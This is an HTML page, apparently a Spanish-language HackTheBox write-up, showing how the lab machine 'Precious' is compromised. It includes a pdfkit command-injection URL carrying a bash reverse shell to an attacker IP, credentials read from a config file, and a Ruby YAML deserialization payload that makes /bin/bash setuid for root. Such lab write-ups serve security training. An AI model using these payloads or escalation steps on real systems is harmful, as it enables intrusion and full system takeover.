@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Precious HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/precious.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Precious HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Precious de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Precious de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Precious HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Precious HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Precious de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Precious HackTheBox</h1>
+          <p>Resolución de la máquina Precious de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.189
+Nmap scan report for 10.10.11.189
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Al hacer un simple curl en las cabeceras podemos ver el dominio precious.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> -s 10.10.11.189 -I | </span><span class="s2">grep</span><span class="p"> Location:
+Location: </span><span class="kd">http://precious.htb/</span>
+</code></pre></div></div>
+
+<div><p>En la web podemos ver ... ¿un convertidor de web a pdfs?</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Creamos un servidor con python para ver si hace alguna petición</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</span>
+</code></pre></div></div>
+
+<div><p>Ahora apuntamos a nuestro servidor http y damos submit</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Nos hace una peticion a nuestro servicio http, pero tambien nos descarga un pdf</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3 </span><span class="p">-m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.189 - - "GET / HTTP/1.1" 200 -</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ls</span><span class="p"> -l
+.rw-r--r-- gato gato  17 KB Fri Dec  2 21:07:38 2022 </span><span class="s2"> archivo.pdf</span>
+</code></pre></div></div>
+
+<div><p>Con exiftool nos dice que se genera con pdfkit y nos da la versión</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ exiftool </span><span class="p">archivo.pdf   
+ExifTool Version Number         : 12.16
+File Name                       : archivo.pdf
+Directory                       : .
+File Size                       : 17 KiB
+File Modification Date/Time     : 2022:12:02 21:07:38-06:00
+File Access Date/Time           : 2022:12:02 21:07:38-06:00
+File Inode Change Date/Time     : 2022:12:02 21:07:53-06:00
+File Permissions                : rw-r--r--
+File Type                       : PDF
+File Type Extension             : pdf
+MIME Type                       : application/pdf
+PDF Version                     : 1.4
+Linearized                      : No
+Page Count                      : 1
+Creator                         : Generated by </span><span class="kd">pdfkit v0.8.6</span>
+</code></pre></div></div>
+
+<div><p>En el siguiente <a href="https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795">articulo</a> nos muestra un payload, cambiamos el sleep por una revshell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">http://example.com/?name=#{'%20`sleep 5`'}</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"`'}</span>
+</code></pre></div></div>
+
+<div><p>Simplemente pegamos nuestro payload con la reverse shell y lo enviamos</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Ahora en nuestro listener tenemos la revshell como ruby</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat </span><span class="p">-lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.189
+</span><span class="s2">ruby@precious</span><span class="p">:</span><span class="na">/var/www/pdfapp</span><span class="p">$ id
+uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
+</span><span class="s2">ruby@precious</span><span class="p">:</span><span class="na">/var/www/pdfapp</span><span class="p">$ hostname -I
+10.10.11.189 
+</span><span class="s2">ruby@precious</span><span class="p">:</span><span class="na">/var/www/pdfapp</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos ver una carpeta .blunde con un archivo config que contiene credenciales de henry</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">ruby@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -la
+drwxr-xr-x 4 ruby ruby 4096 Dec  2 22:03 </span><span class="na">.</span><span class="p">
+drwxr-xr-x 4 root root 4096 Oct 26 08:28 </span><span class="na">..</span><span class="p">
+lrwxrwxrwx 1 root root    9 Oct 26 07:53 </span><span class="na">.bash_history </span><span class="p">-></span><span class="no"> /dev/null</span><span class="p">
+-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
+dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 </span><span class="na">.bundle</span><span class="p">
+drwxr-xr-x 3 ruby ruby 4096 Dec  2 22:03 </span><span class="na">.cache</span><span class="p">
+-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 </span><span class="na">.profile</span><span class="p">
+</span><span class="s2">ruby@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ cd .bundle/
+</span><span class="s2">ruby@precious</span><span class="p">:</span><span class="na">~/.bundle</span><span class="p">$ ls
+</span><span class="s2">config
+ruby@precious</span><span class="p">:</span><span class="na">~/.bundle</span><span class="p">$ cat config
+---
+BUNDLE_HTTPS://RUBYGEMS__ORG/: "</span><span class="kd">henry:Q3c1AqGHtoI0aXAYFH</span><span class="p">"
+</span><span class="s2">ruby@precious</span><span class="p">:</span><span class="na">~/.bundle</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Nos conectamos por ssh como henry y obtenemos la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">henry@10.10.11.189
+henry@10.10.11.189's password: </span><span class="kd">Q3c1AqGHtoI0aXAYFH</span><span class="p">
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(henry) gid=1000(henry) groups=1000(henry)
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.189 
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+d28**************************db5
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando permisos de sudoers, podemos ejecutar un archivo de ruby como root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+Matching Defaults entries for henry on precious:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User henry may run the following commands on precious:
+    (</span><span class="na">root</span><span class="p">) NOPASSWD: </span><span class="kd">/usr/bin/ruby /opt/update_dependencies.rb</span><span class="p">
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si leemos el archivo podemos ver que en una parte intenta cargar a dependencies.yml</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /opt/update_dependencies.rb | head -n11 | tail -n3
+def list_from_file
+    YAML.load(File.read(</span><span class="s2">"dependencies.yml"</span><span class="p">))
+end
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos crear el archivo dependencies.yml en el directorio actual con el siguiente <a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml">payload</a> como contenido para que nos ejecute un comando para hacer la bash suid</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat dependencies.yml
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: </span><span class="kd">chmod u+s /bin/bash</span><span class="p">
+         method_id: :resolve
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora al ejecutar el script ruby y cargar el yml, ejecutara el comando y la bash sera suid</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo ruby /opt/update_dependencies.rb 2>/dev/null
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 </span><span class="kd">/bin/bash
+</span><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ejecutamos la bash como el propieratio y somos root ahora podemos leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">henry@precious</span><span class="p">:</span><span class="na">~</span><span class="p">$ bash -p
+bash-5.1# whoami
+root
+bash-5.1# hostname -I
+10.10.11.189
+bash-5.1# cat /root/root.txt 
+f93**************************e0a
+bash-5.1#</span>
+</code></pre></div></div>
+
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
